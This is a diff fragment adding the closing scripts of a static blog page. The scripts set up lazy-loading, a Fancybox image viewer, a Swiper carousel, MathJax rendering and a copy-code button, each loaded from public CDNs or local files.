+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+    processEscapes: true
+  }
+});
+MathJax.Hub.Config({
+  tex2jax: {
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  }
+});
+MathJax.Hub.Queue(function() {
+  var all = MathJax.Hub.getAllJax(), i;
+  for(i=0; i < all.length; i += 1) {
+    all[i].SourceElement().parentNode.className += ' has-jax';
+  }
+});
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
